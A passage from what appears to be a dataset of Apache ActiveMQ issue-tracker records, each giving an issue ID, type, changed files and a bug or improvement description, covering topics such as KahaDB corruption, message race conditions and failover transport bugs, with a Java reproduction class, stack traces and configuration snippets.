NIO transport uses unbounded thread pool executor to handle read operation. Under large number of connections and load, this could lead to large number of threads and eventually OOM errors. Which is the exact problem that nio transport is supposed to solve. Some work has been done in AMQ-5480, to make this configurable, but there"s still more work to make it more robust. Creating a fixed thread pool with a queue in front gives much better results in my tests.Additionally, the same thread pool is used for accepting connections (AMQ-5269). This can lead to the broker not being able to accept new connections under the load. I got much better results when experimenting with implementing acceptor logic directly and handling it in the same thread (without reintroducing the old problem). With these two improvements in place, the broker accept and handle the number of connections up to the system limits.
issueID:AMQ-6187
type:Bug
changed files:
texts:MQTT Tests using SSL fail on latest JDK 8 release
Tests that use SSL fail due to the way they initialize their SSL Context, simple fix is to use the same mechanism as is used to initialize the broker SSLContext to initialize the MQTT client provider.
issueID:AMQ-6188
type:Bug
changed files:
texts:Queues containing PERSISTENT messages can be garbage collected due to Inactivity
It is possible for a queue to be garbage collected due to inactivity despite undelivered PERSISTENT messages being present on the queue.Order of events- unused queue is marked for garbage collection due to inactivity prior to garbage collection, an anonymous producer comes online, sending one or more messages, then closing   Note: the queue"s lastActiveTime is not reset when an anonymous producer is created because they are not bound to a destination at creation.   queue with pending Message(s) is garbage collectedA simple fix for this seems to be resetting BaseDestination#lastActiveTime to zero each time a message is sent (BaseDestination#messageDelivered(context, messageReference)).I"ll submit a PR with a patch shortly.
issueID:AMQ-6189
type:Improvement
changed files:
texts:Installation directories should be defined earlier in "env" configuration file
When running AMQ with configuration files (env or appropriate location) set to use an alternate directory (ex ACTIVEMQ_CONF) not all parameters are able to use the alternate paths with current ordering.This is easily changed for installations/setups that need it.I think the default installation directories should be defined at/moved to the start of the file to ensure any item using these values have access to the configured values.
issueID:AMQ-6194
type:Bug
changed files:
texts:Deleting a temporary queue creates a warning message in the broker
When deleting a temporary queue, the ActiveMQ 5.13.1 (and 5.12.2) broker logs the following warning message:INFO  [ActiveMQ NIO Worker 111] [TempQueue] temp-queue://ID:brokerHostname-57582-1455804170203-8569:1:1 on dispose, purge of 1 pending messages: org.apache.activemq.broker.region.cursors.VMPendingMessageCursor@e0f6196WARN  [ActiveMQ NIO Worker 111] [Queue] temp-queue://ID:brokerHostname-57582-1455804170203-8569:1:1 after purge of 1 messages, message count stats report: 1The cause of this warning seems to be the publication of a "ghost" message when sending a single message on the temporary queue from a transacted session, as demonstrated by this test class:import java.text.SimpleDateFormat;import java.util.Date;import javax.jms.Connection;import javax.jms.JMSException;import javax.jms.MessageProducer;import javax.jms.Session;import javax.jms.TemporaryQueue;import javax.jms.TextMessage;import org.apache.activemq.ActiveMQConnectionFactory;public class GhostMessageOnTempQueueWithTransactedSessionDemo {    public static void main(final String[] args) throws JMSException {        final ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory("tcp://localhost:61616");        Connection connection = null;        Session session = null;        MessageProducer producer = null;        TemporaryQueue temporaryQueue = null;        try {            connection = factory.createConnection();            connection.start();            // The session has to be transacted for the second "ghost" message to appear (see below).            session = connection.createSession(true, Session.SESSION_TRANSACTED);            // And the publication has to be on a temporary queue (if the temporary queue is created by another process, the second "ghost" message still appears).            temporaryQueue = session.createTemporaryQueue();            producer = session.createProducer(temporaryQueue);            final TextMessage textMessage = session.createTextMessage();            textMessage.setText("GhostMessageDemo@" + new SimpleDateFormat("yyyy-MM-dd"T"HH:mm:ss,SSSZ").format(new Date()));            producer.send(textMessage);            // Here, in ActiveMQ 5.13.1 and 5.12.2, the message was sent but cannot be browsed or consumed. It can however be seen in the JMX console with:            // - EnqueueCount, that was increased by one;            // - MemoryUsageByteCount (by sending huge messages of different size to ensure that it is indeed the real message).            // In ActiveMQ 5.10.2 (and 5.4.1), it is not sent (even though SocketOutputStream.socketWrite is still called through TcpFormat.oneway?).            session.commit();            // Here, in ActiveMQ 5.13.1, a "ghost" message was sent (EnqueueCount has increased by one again) and the real message is visible and can be consumed.            // If rollback is called instead, the real message stays (and cannot be consumed since the "ghost" message is not sent).        } finally {            if (producer != null)                producer.close();            if (temporaryQueue != null)                // Here, if there was a consumer on the queue, it would have consumed the real message, leaving the "ghost" message that lead to the broker warning.                temporaryQueue.delete();            if (session != null)                session.close();            if (connection != null) {                connection.stop();                connection.close();            }        }    }}
issueID:AMQ-6199
type:Bug
changed files:
texts:cursorMemoryHighWaterMark configuration not applied to topic subscription
One can configure <policyEntry topic=">" cursorMemoryHighWaterMark="10" />but that cursorMemoryHighWaterMark is not set on the effective TopicSubscription. As a result, topic messages don"t get swapped to disk once the explicitly configured water mark is reached.That should be a usage percentage of the systemUsage memory usage limit, but it stays at the default 70 in error
issueID:AMQ-620
type:Task
changed files:
texts:Get openwire-cpp buiding on linux/gcc
Need to get the c++ port of the openwire-c# client building on linux.  I"m posting code that should help get there.  There are a few outstanding issues ... 1) the use of smart pointers seems to be a problem for the compiler. 2) autogenerated code for command/marshall files is using undefined types
issueID:AMQ-6203
type:Improvement
changed files:KahaDBPersistenceAdapter.java
MessageDatabase.java
texts:KahaDB: Allow rewrite of message acks in older logs which prevent cleanup
There are cases where a chain of journal logs can grow due to acks for messages in older logs needing to be kept so that on recovery proper state can be restored and older messages not be resurrected.  In many cases just moving the acks from one log forward to a new log can free an entire chain during subsequent GC cycles.  The "compacted" ack log can be written during the time between GC cycles without the index lock being held meaning normal broker operations can continue.
issueID:AMQ-6204
type:Bug
changed files:
texts:Advisory broker does not properly remove virtual consumer demand
When virtual destination network demand is enabled based on the existence of a destination ( the useVirtualDestSubsOnCreation flag as described in AMQ-6027) , there is a map called brokerConsumerDests that tracks the unique demand for the existence virtual destinations.Elements are not being properly removed from this map when a virtual destination is removed.  All elements are being removed from this map instead of just the ones that match the removed virtual destination.  This can cause entries in a different map (the virtualDestinationConsumers map) to not be cleaned up and for duplicates to be added if the virtual destination is re-added later.  This can lead to a memory leak as this map can continue to grow and not be cleaned up.
issueID:AMQ-6206
type:Bug
changed files:
texts:properties in stomp non persistent messages are not reflected in the message size used for usage tracking
stomp messages are passed on from the protocol converter directly so their properties are not marshalled. Only marshalled properties are tracked for usage by Message.getSize
issueID:AMQ-6207
type:Bug
changed files:PageFile.java
texts:KahaDB: corruption of the index possible on sudden stop of the broker
On a sudden stop of the broker it"s possible for the KahaDB index to become corrupt and the broker will refuse to start.  The issue is in the PageFile code that is mixing writes to both the recovery file and the index file.  The writes need to happen in a deterministic way such that the recovery file isn"t missing data that might make it into the the main index file.
issueID:AMQ-6208
type:Bug
changed files:
texts:The connector&#39;s jmx attribute UpdateClusterClients is not correct
cut nd paste or auto complete error in connector view attribute isUpdateClusterClientsOnRemove being returned in error for isUpdateClusterClients
issueID:AMQ-6209
type:Bug
changed files:TcpTransportServer.java
texts:Unmatched messages on consumer queues when using SubQueueCacheSelectorPlugin in network of browsers
When using SubQueueSelectorCachePlugin to preserve consumers" selectors in network of brokers, the queues start matching all messages after consumers failover between brokers.The underlying reason is, that SubQueueSelectorCacheBroker would cache selector TRUE for connected demand subscription, and therefore will permanently match all messages even if actual consumer reconnects.Additionally, browsing the queue will also cause TRUE selector to be persisted.
issueID:AMQ-6210
type:Bug
changed files:
texts:SubQueueCacheSelectorPlugin stores information on temporary queues
SubQueueCacheSelectorPlugin stores selector data on temporary destinations.I believe this is not necessary, as temporary destinations would cease to exist when their creator disconnects, And the creator is also usually their consumer in request-response scenarios.This leads to ever growing cache file, and since this is just persisted in-memory map, also to unnecessary memory consumption.
issueID:AMQ-6211
type:Bug
changed files:OpenTypeSupport.java
texts:Synchronize creating of JMX OpenType objects
In certain scenarios multiple threads can try to initialize the same openmbean type, which can lead to these type of exceptions.javax.management.openmbean.OpenDataException: Argument"s element itemNames[25]="JMSCorrelationID" duplicates a previous item names. at javax.management.openmbean.CompositeType.<init>(CompositeType.java:153) at org.apache.activemq.broker.jmx.OpenTypeSupport$AbstractOpenTypeFactory.createCompositeType(OpenTypeSupport.java:82) at org.apache.activemq.broker.jmx.OpenTypeSupport$AbstractOpenTypeFactory.getCompositeType(OpenTypeSupport.java:70) at org.apache.activemq.broker.jmx.OpenTypeSupport.convert(OpenTypeSupport.java:543) at org.apache.activemq.broker.jmx.DestinationView.browse(DestinationView.java:206) at org.apache.activemq.broker.jmx.DestinationView.browse(DestinationView.java:186) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at sun.reflect.misc.Trampoline.invoke(MethodUtil.java:75) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at sun.reflect.misc.MethodUtil.invoke(MethodUtil.java:279) at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMBeanIntrospector.java:112) at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMBeanIntrospector.java:46) at com.sun.jmx.mbeanserver.MBeanIntrospector.invokeM(MBeanIntrospector.java:237) at com.sun.jmx.mbeanserver.PerInterface.invoke(PerInterface.java:138) at com.sun.jmx.mbeanserver.MBeanSupport.invoke(MBeanSupport.java:252) at javax.management.StandardMBean.invoke(StandardMBean.java:405) at org.apache.activemq.broker.jmx.AnnotatedMBean.invoke(AnnotatedMBean.java:216)Creating composite type should be synchronized.
issueID:AMQ-6212
type:Bug
changed files:
texts:activemq-all jar should include spring-messaging classes
Spring 4.0.x and above introduced a new jar file, spring-messaging, and these classes are a dependency on spring-jms.  This jar file should be included in the shaded activemq-all jar.
issueID:AMQ-6213
type:Bug
changed files:
texts:Unable to use default login config in "activemq*.bat" files if ActiveMQ is installed in a path with spaces.
If ActiveMQ is installed in a path with spaces (like: "C:Program FilesAMQ"), the batch files activemq.bat and activemq-admin.bat cannot start the service. The source of the issue appears to be that the -Djava.security.auth.login.config command line option is getting passed a raw path value that is not properly encoded for spaces in the path. I have a patch available that surrounds this parameter value with quotations.
issueID:AMQ-6214
type:Bug
changed files:
texts:JAAS bug that causes user group membership not reloaded dynamically when reload is true
There is a bug in JAAS that caused users group membership not dynamically loading at runtime. Specifically, when I used the org.apache.activemq.jaas.PropertiesLoginModule with reload=true, changes in user name and password were reflected in connections after the changes, but changes in group membership was not reloaded/picked up by new connections.The configuration of my broker xml and users.properties, groups.properties, as well as the login.config files are attached.  The problem was repeatable always.The cause of the problem was identified as the groups membership was cached and the cache was not cleared (reloaded) after the groups.properties file change.The fix is to add one line of code in the org.apache.activemq.jaas.ReloadableProperties.java class.The src code with the fix for org.apache.activemq.jaas.ReloadableProperties.java is attached in the ticket as well.Please verify the fix and merge this one line of code change in org.apache.activemq.jaas.ReloadableProperties.java class in src branches for 5.13.0 as I tested the problem with 5.13.0 only.  The fix should be carried forward and retroactively merged into previous versions as well.There is no negative impact on software or any noticeable impact on server performance.
issueID:AMQ-6215
type:Bug
changed files:
texts:priority message dispatch can be affected by jms browser or expiry processing paging messages in error
Using a pull consumer it should be possible to always get the most recent high priority message. Even with a default page size, using lazy dispatch should pull in the correct number of messages from the cursor to satisfy each consumer.However periodic message expiry processing and queue browsing via jms or jmx will affect dispatch by pulling messages into the cursor.Using a small maxBrowsePageSize and maxExpirePageSize should suffice to ensure a window for dispatch but this currently fails because the limits are not enforced.Also, asyncDispatch treats a jms browser as a consumer w.r.t paging messages from the cursor, which has a similar side effect and thwarts lazyDispatch
issueID:AMQ-6218
type:Bug
changed files:ActiveMQTextMessage.java
texts:Message content returns null occasionally from Virtual Topic to the consumer
I have 1 Virtual Topic and 40 Consumer to consume the messages sent by the topic. The problem is when I am sending thousands of Messages lets say 10000 via Virtual Topic I have noticed that 2 or 3 consumer are getting null as a text when I do message.getText(), but virtual topic is not sending a null as a text message if it so then all 40 consumer should report same.I have also noticed this problem is not happening in AMQ v5.11 or with levelDB in AMQ v5.12.2/5.13.2. It is happening only in when you use kahaDB with AMQ v5.12.2/5.13.2
issueID:AMQ-6221
type:Bug
changed files:ActiveMQTextMessage.java
texts:ActiveMQTextMessage should synchronize on state changes
In AMQ-5857, the text field was changed to be cleared after calling beforeMarshall on a text message.  This is causing general concurrency issues when multiple threads access the message.  The most notable issue is when using the VM transport and concurrent store and dispatch is turned on for KahaDB as seen in AMQ-6218.  In that ticket I re-arranged the order a bit on copy to help with the race condition but it is still theoretically possible.  We need to add explicit synchronization when reading/writing the marshalled/unmarshalled state fields to prevent the race condition in ActiveMQTextMessage.Right now ActiveMQTextMessage is the main issue since it has been changed to clear out text on marshalling by default.   Map and Object messages don"t currently clear out their data by default like text message does so they aren"t currently affected but would need synchronization added in a future commit if the same strategy was followed.
issueID:AMQ-6222
type:Bug
changed files:Queue.java
texts:Message content can be cleared by mistake when isReduceMemoryFootprint is enabled
In a Queue when isReduceMemoryFootprint is enabled the message state should be cleared after persisting to the store.  The idea is that once the data is marshalled into its byte content we can clear out the properties, text, etc to free up memory.The problem is that when concurrent dispatch is enabled, messages are added to the store asynchronously and queued up.  There is a race condition because it"s possible for the state to be cleared before the store has a chance to process the message so that when it gets to it, it will be null.  This is most notable when using the VM transport as messages with null content will get dispatched.
issueID:AMQ-6223
type:Improvement
changed files:
texts:Include activemq-junit jar in binary distribution
With the addition of the JUnit @Rule for embedded brokers it would be useful if the JUnit jar was included in the binary distribution.
issueID:AMQ-6228
type:Improvement
changed files:AmqpFrameParser.java
IOExceptionSupport.java
OpenWireFormat.java
texts:Max Frame Size Error exception shows incorrect values at times
If the value is below the size of 1 MB the error message reads 0 MB instead of scaling down to bytes or KBs
issueID:AMQ-6230
type:Bug
changed files:
texts:Camel 2.17.0 breaks Karaf integration tests
The new Camel version seems to cause the ActiveMQBrokerNdCamelFeatureTest test to fail.https://builds.apache.org/view/A/view/ActiveMQ/job/ActiveMQ-Java8/lastBuild/org.apache.activemq$activemq-karaf-itest/testReport/org.apache.activemq.karaf.itest/ActiveMQBrokerNdCamelFeatureTest/test/It looks like a bunch of work was done with Karaf and to get rid of Spring DM in the new version which is probably the issue as ActiveMQ still has the Spring DM stuff laying around.
issueID:AMQ-6235
type:Bug
changed files:SimpleDiscoveryAgent.java
texts:SimpleDiscoveryAgent doesn&#39;t honor it&#39;s configured initialReconnectDelay
The SimpleDiscoveryAgent code has a configurable initialReconnectDelay that is not currently used correctly.  If the connection is lost right away on a connect attempt it may use the delay but if the connection has been up longer than the configurable minConnectTime then a connection attempt is immediately tried and will then drop back to the initialReconnectDelay if this immediate reconnection attempt fails.
issueID:AMQ-6239
type:Improvement
changed files:
texts:Performance issue in PrioritizedPendingListIterator
Sending and consuming 5000 messages to/from a queue, one can see heavy CPU use on the broker side (v 5.12.2).Yourkit shows PrioritizedPendingList$PrioritizedPendingListIterator.<init>as a hot spot method. It calls ArrayList.add(Object) around 12 mio times.Situation is that FilePendingMessageCursor.isEmpty() iterates over in-memory messages and therefore (as it is a prioritized queue) uses PrioritizedPendingListIterator which uses OrderedPendingList.getAsList() which overall turns out to be an expensive method as it converts the self-managed linked list to a Java ArrayList and then this list is filled into another ArrayList managed by PrioritizedPendingListIterator.PrioritizedPendingListIterator could be improved to walk the priority lists via OrderedPendingList iterators, as these are implemented efficiently.
issueID:AMQ-624
type:Improvement
changed files:
texts:add XAConnectionFactory implementation
None
issueID:AMQ-6240
type:Bug
changed files:
texts:Producer cannot be terminated when slow consumer is detected
There is a discussion relating to the bug here - http://activemq.2283324.n4.nabble.com/Force-Producer-to-fail-when-blocked-by-slow-consumer-td4710264.html. Test code to reproduce the problem  has also been uploaded to this discussion.We have  a situation where we have a producer which is feeding a slow consumer.The consumer belongs to a third party so we do not have control over the broker configuration.We would like to terminate our producer but we find that we cannot do so. We can set the timeout on the connection and we then trap the timeout exception. The problem is that when we try to close the session it attempts to rollback but cannot do so as the rollback blocks.We have created a small test that is included in the zip (mentioned above) of an Eclipse project.The zip includes three classes. Call the main method of RunTest to run the test. The activemq.xml used is in the root directory of the project. The program will timeout after 51 messages and attempt to close the session. It eventually locks in this line:             this.connection.syncSendPacket(info); in the rollback method of the TransactionContext class.We believe that the most sensible solution to this is that the rollback should respond to the same timeout as the connection.
issueID:AMQ-6244
type:Bug
changed files:
texts:ActiveMQBytesMessage fails to set &#39;compressed=false&#39; following restoration of compressed message content
ActiveMQBytesMessage does not reset its compressed flag to false following the restoration of compressed message content in restoreOldContent().  This becomes a problem if an ActiveMQBytesMessage is reused by a client on an uncompressed connection after originally being published on a compressed connection.Steps to reproduce: An ActiveMQBytesMessage is published by a producer on a connection with compression enabledMessage State: compressed=true; content=compressed The message is consumed by a client and republished on a connection with compression disabledMessage State: compressed=true; content=uncompressed The message is consumed by a client and its contents are read.  The ActiveMQ client library tries to decompress the message content, but fails because the content is not compressed.  This causes the consumer to throw either a DataFormatException or NegativeArraySizeException.This JIRA is similar in nature to AMQ-5381.I"ll submit a pull request with a test to reproduce and a patch shortly.
issueID:AMQ-6245
type:Bug
changed files:ActiveMQMessageConsumer.java
texts:Potential NPE on close of a zero prefetch consumer
If a zero prefetch consumer is closed and there is still an pull timed out message marker in the unconsumed list the logging in the dispose method can trigger an NPE.
issueID:AMQ-6246
type:Bug
changed files:
texts:STOMP: Unprefixed composite destination values not properly parsed
STOMP destinations that are intended to be composite type but lack standard destination prefixes are not being properly parsed and converted.
issueID:AMQ-6247
type:New Feature
changed files:BrokerService.java
texts:Opportunity to define BouncyCastle security provider priority
In org.apache.activemq.broker.BrokerService BouncyCastle security provider is used if it is presented, but there is no opportunity to choose provider priority (it is always inserted in second place, but there can be more than one provider).
issueID:AMQ-6248
type:Bug
changed files:FailoverTransport.java
texts:Failover - transport connected to one broker fails due to error in connection to another broker
There is a bug in the  FailoverTransport which is triggered by a race condition. The client log contains message:WARN | ActiveMQ Transport: URI1 [FailoverTransport] Transport (URI2) failed, attempting to automatically reconnectThe exact impact on client failover differs with each setup and environment. In our case this forced client to infinitely switch between two available brokers.Assume client is configured to use broker URL in formfailover:(URI1,URI2)?randomize=false.Assume that broker with URI1 is down and the other broker URI2 is running fine. This is normal master/slave setup. Client tries to establish connection and the following happens:1. URI1 is tried, it fails because this broker is not reachable (down or waiting slave)2. URI2 is tried, it succeeds because this broker is currently the "master"3. Exception from thread of transport to URI1 causes failure in transport to URI24. Try another transport in the list. Oh wait, its URI1 -> go to 1.Impact for different configurations might not be that severe. But unfortunately in our case we were not able to avoid this bug no matter the configuration. For example randomize=true helped a little, but still the inifinite loop happens 1/2 of the time.The bug is caused by a single shared instance myTransportListener of TransportListener in FailoverTransport class. doReconnect() tries to start transport to URI1 and registers the listener on it. Transport fails to start and the next transport to URI2 is tried. But the listener is not unregistered from the failed transport URI1. Failures that happen on transport URI1 may call in its own thread the listener method onException(). This call will get to handleTransportFailure() where it waits for the reconnectMutex. The reconnect task thread continues, establishes Transport URI2, sets it to connectedTransport=URI2, releases the reconnectMutex. The thread of transport URI1 unblocks in handleTransportFailure() and destroys the connectedTransport=URI2.I have created a patch against version 5.11 that deals specifically with this problem.The change is that instead of the single shared myTrasnportListener instance there is a new listener created for each new transport.Each new listener keeps reference to the transport it was assigned to. The listener will cause failover only if the exception is coming from the transport which is currently connected.I didn"t care about the other methods of the listener, but these probably need the same restriction.This bug is present in all versions from version 4.0 (I didn"t go deeper). The idea in the patch should be applicable for all versions.Btw. log message mentioned in AMQ-4986 contains the same URI1 vs URI2 problem.
issueID:AMQ-625
type:Improvement
changed files:DurableTopicSubscription.java
SubscriptionView.java
AbstractSubscription.java
SubscriptionViewMBean.java
ActiveMQQueueBrowser.java
Subscription.java
texts:add ability to change a non-durable subscription dynamically via JMX
users have sometimes asked for the ability to change selectors at runtime. While this goes against the JMS specification, we could add a setSelector(String) method to the SubscriptionView MBean so if folks wanted to update the  selector dynamically they could.This feature would only work with non-durable topic subscriptions - for topic subscriptions they are persistent - but could be useful if used with caution.For totally dynamic content based routing, we recommend using a routing component which is a JMS consumer/producer.http://eaipatterns.com/DynamicRouter.html Better still use a full ESB like Apache ServiceMix (http://incubator.apache.org/servicemix/)
issueID:AMQ-6250
type:Bug
changed files:MultiKahaDBTransactionStore.java
texts:MultiKahaDBTransactionStore should have null protection in close
When utilizing the MultiKahaDBPersistenceAdapter and there is a failure during broker startup, (depending on when the startup failure occurs) a secondary NullPointerException can be generated from MultiKahaDBTransactionStore.close.  this happens if the transaction store is closed when it has not yet been opened.  the problem is that the close method does not check the journal for null before closing.
issueID:AMQ-6251
type:Bug
changed files:Queue.java
texts:Queue resetNeeded field should be volatile
The Queue.resetNeeded field should be volatile due to the fact that it is exposed outside of any additional synchronization (via the Queue.isResetNeeded() method).  without the volatile modifier, the flag could be set but not recognized by any external code checking it.
issueID:AMQ-6252
type:Bug
changed files:
texts:HealthView has a variety of weaknesses
The HealthView utility has a variety of weaknesses. The currentState field should be volatile to ensure correct visibility in a multi-threaded environment the assignment to the currentState field at the end of the healthList method should only happen once the final string has been built.  the current code could expose a caller to a partially built string (since the field is continually re-assigned as the string is built).On a separate note, the semantics of this class are non-obvious.  We were monitoring our broker via jmx using the CurrentState attribute for a year or so now and i only just realized that the value is useless.  The value is useless because it is only updated if you call the healthList() method first.  The CurrentState attribute is the one someone would most likely monitor using an external automated management product, yet it is not useful by itself.  I would recommend one of the following approaches: at the very least, the current behavior should be clearly documented so that users know they have to call one of the other methods first in order to get a valid CurrentState Alternately, it would be nice if calling the getCurrentState() by itself were sufficient.  this could be accomplished via one of the following approaches:   Have the BrokerService schedule a periodic task to invoke the healthList() method in order to ensure that the CurrentState attribute gets updated.  Track a "last updated" field within the HealthView class and have the getCurrentState() method itself invoke the healthList() method first if the currentState is too old.
issueID:AMQ-6253
type:Bug
changed files:
texts:Composite destination support for MQTT
Although not part of the spec, composite destinations work properly for the default subscription strategy. Virtual topic subscription strategy doesn"t convert composite destination names properly (adding just a prefix to the first destination name).
issueID:AMQ-6256
type:Bug
changed files:KahaDBStore.java
texts:ConcurentStoreAndDispatch can lead to inconsistent message states using VM Transport
When messages are added to a store asynchronously (when using concurrent store and dispatch) and then dispatched to a consumer at the same time, there is a race condition that can occur primarily with the VM Transport.  The issue is that it"s possible that when the VM Transport is copying the message for dispatch, the async task can run at the same time to store the message.  It"s possible that the copy on dispatch can occur during the same time the async store task is trying to marshall the data and properties which can lead to an inconsistent state of the message (ie null content).  This is the cause of the issue in AMQ-6218.The proper fix for this is to make sure the beforeMarshall method is called prior to the task running and prior to dispatch.
issueID:AMQ-6259
type:Improvement
changed files:WSTransportServer.java
WSServlet.java
AbstractMQTTSocket.java
texts:Enable configuration for mqtt-over-ws transport
At the moment we can"t configure mqtt protocol converter on the ws transport the same way as when it"s used over tcp.For example, we should be able to enable virtual topic subscriptions like<transportConnector name="ws" uri="ws://0.0.0.0:61614?transport.subscriptionStrategy=mqtt-virtual-topic-subscriptions"/>
issueID:AMQ-6262
type:Bug
changed files:
texts:HTTP transport broken in 5.12
A regression from https://issues.apache.org/jira/browse/AMQ-5794 .Connection watchdog is started for every initiated connection and stopped on WireFormatInfo command. HTTP transport doesn"t send WireFormatInfo so the watchdog never realises that the connection has been successfully established.The connection gets terminated every 30seconds by the watchdog.At the beginning, everything looks fine, but then you start getting exceptions and start losing packets. I haven"t seen that myself, but I had people reporting that if HTTP transports are in use, it eventually destabilises the broker and affects non-HTTP transports too.2016-04-22 10:32:46.029244500 2016-04-22 10:32:46,029 WARN [ActiveMQ InactivityMonitor Worker] [Transport] Transport Connection to: blockingQueue_28120594 failed: org.apache.activemq.transport.InactivityIOException: Channel was inactive2016-04-22 10:33:30.988313500 org.apache.activemq.transport.InactivityIOException: Channel was inactive (no connection attempt made) for too (>30000) long: blockingQueue_216445172016-04-22 10:33:30.988637500   at org.apache.activemq.transport.AbstractInactivityMonitor$1$1.run(AbstractInactivityMonitor.java:91)2016-04-22 10:33:30.988667500   at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)2016-04-22 10:33:30.988689500   at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)2016-04-22 10:33:30.988717500   at java.lang.Thread.run(Thread.java:745)
issueID:AMQ-6263
type:Bug
changed files:
texts:AMQP: Using JMS Transformer, preserve the type of the original MessageID
When transforming the incoming message using the JMS Transformer the type of the incoming message ID is lost when stored in the text view value in the MessageId object, we need to preserve that type as this is meant to be immutable.
issueID:AMQ-6267
type:Improvement
changed files:
texts:Allow advisory consumer prefetch configuration for network consumers
In most places the prefetch value for advisory consumers is configured separately than the prefetch value for non-advisory consumers because by default advisory consumers are configured to optimize acknowledgements.  However, while the NetworkBridgeConfiguration allows setting prefetchSize it does not allow configuring advisory prefetch size. It would be useful to be able to configure the prefetch size separately for advisory consumers, as well as the percentage of prefetch used for determining when to send back an ack (currently set to 75%)
issueID:AMQ-627
type:Bug
changed files:ResponseHolder.java
ActiveMQQueueBrowser.java
texts:ActiveMQConnection ignores interrupts (sometimes)
There are a bunch of these in the code:                try {                        ...                } catch (InterruptedException e) {                }Which should be                try {                        ...                } catch (InterruptedException e) {                        Thread.currentThread().interrupt();                }... or                 try {                        ...                } catch (InterruptedException e) {                        throw JMSExceptionSupport.create(e);                }... or whatever. Just don"t throw away my interrupts.
issueID:AMQ-6273
type:Bug
changed files:ReconnectionPolicy.java
JmsConnector.java
texts:ReconnectionPolicy.getNextDelay(int attempt) always returns zero when maxReconnectAttempts/maxInitialConnectAttempts == ReconnectionPolicy.INFINITE
The v.5.12.1 release of class org.apache.activemq.network.jms.JmsConnector contains a defect within method private void doInitializeConnection(boolean local) throws Exception that causes the attempt variable to always retain a value of zero if ReconnectionPolicy.maxReconnectAttempts/maxInitialConnectAttempts == ReconnectionPolicy.INFINITE. (irrespective of the actual number of loop iterations)This indirectly prevents the connector from using any of the following ReconnectionPolicy configuration properties:private long initialReconnectDelay = 1000L;private long maximumReconnectDelay = 30000;private boolean useExponentialBackOff = false;private double backOffMultiplier = 2.0;The defect is triggered by inclusion of increment operator for attempt variable within do/while loop condition evaluation.  Line 630 of class JmsConnector uses short-circuit evaluation and this prevents value from being incremented whenever maxRetries == INFINITE  evaluates to true:while ((maxRetries == INFINITE || maxRetries > ++attempt) && !connectionService.isShutdown());
issueID:AMQ-6274
type:New Feature
changed files:
texts:Add option to composite destinations to set originalMessage header
Composite Destinations are a great way to wiretap messages, but the resulting messages don"t have any information in them about where they originally came from.I"m proposing to add an option to composite destinations ( addHeaders ) that will enable the addition of the originalDestination header to the messages.  The option will be disabled by default to preserve existing behavior by default.
issueID:AMQ-6275
type:Bug
changed files:TransportConnection.java
texts:Error when using ws transport connector
Googled it. Only 20 pages found.broker.xml:<transportConnectors> <!-- DOS protection, limit concurrent connections to 1000 and frame size to 100MB --> <transportConnector name="openwire" uri="tcp://0.0.0.0:61616?maximumConnections=1000&amp;wireFormat.maxFrameSize=104857600" /> <transportConnector name="websocket" uri="ws://0.0.0.0:61614" /> <transportConnector name="mqtt" uri="mqtt+nio://0.0.0.0:1883" /></transportConnectors>About 43 topics total.3 publishers, 1 message per second.Firefox subscribed to 39 topics (websocket).After few messages received, the following error occurs (Karaf log:tail):Transport Connection to: ws://x.x.x.x:xxxx failed: java.io.IOException: Blocking message pending 10000 for BLOCKING
issueID:AMQ-6276
type:Improvement
changed files:
texts:Remove fileserver webapp
Fileserver webapp is legacy application and users are discouraged to use it in production. We already made it obsolete with AMQ-5754. People should use proper FTP or file servers for their needs.
issueID:AMQ-6277
type:Improvement
changed files:MessageDatabase.java
texts:KahaDB does journal recovery for last append in error in normal restart case
On a normal restart - the journal is replayed from the last append location in error. Reporting some unnecessary info logging of the formINFO | Recovering from the journal @1:503 INFO | Recovery replayed 1 operations from the journal in 0.0 seconds.Recovery is only required when the last append location is different from the recovery location.
issueID:AMQ-6278
type:Improvement
changed files:LeaseDatabaseLocker.java
texts:Revisit the log level in LeaseDatabaseLocker
While waiting on a lock, the log is filled with INFO entries of attempts. This can fill the log. We should change those to DEBUG level.
issueID:AMQ-6281
type:Bug
changed files:CompositeDestinationFilter.java
CompositeDestination.java
texts:CompositeDestination copyMessage configuration is no longer valid
The configuration value copyMessage in CompositeDestination is no longer valid, the messages always need to be copied so their destination value can be updated before being routed through the broker.We can deprecate this option and ignore it in the current code base.
issueID:AMQ-6285
type:Bug
changed files:MessageDatabase.java
texts:MessageDatabase doesn&#39;t properly cleanup the checkpoint scheduler on shutdown
On KahaDB store close the checkpoint scheduler service is shutdown but it is not set to null.  This is an issue because on startup of the store, the scheduler is checked for null and only started if it is null.  Therefore, if a store was previously started and shutdown, when started again the thread would not re-start.This would not normally cause a problem for the usual use case as a store is typically only closed when the broker is shut down, however it is a good idea to fix it as this behavior could change in the future plus the start/stop methods are public on the store so it is possible to start/stop the store even though it isn"t normally done.
issueID:AMQ-6286
type:Bug
changed files:
texts:Queue order lost on repeated redelivery
When a consumer prefetches messages or consumes and does not ack in pull mode, on close, any messages that have not been acked end up in on the broker in the already delivered list.These messages get dispatched first. However, if these messages are unconsumed again, they get appended to the dispatched list.This makes sense when there are multiple consumers, A gets 10, B gets 10, A closes, there are 10 to redeliver, B closes, there are now 20 to redeliver. the order should be preserved.However if there is a single consumer this breaks.Consider: publish 100 to Qconsume 50 and rollback/close with all unacked, expect 0-49consume 10 and rollback/close with all unacked, expect 0-9consume 10 more ... expect 0-9 but get 10-19!In concert with the strictOrderDispatch policy, I think we should be able to support the natural expectation here.The scenario presents its self with prefetched messages where the prefetch varies or more naturally with a single consumer that consumed in various transaction batches. In the transacted case, two failures would result in compromised queue ordering.
issueID:AMQ-6288
type:Bug
changed files:MessageDatabase.java
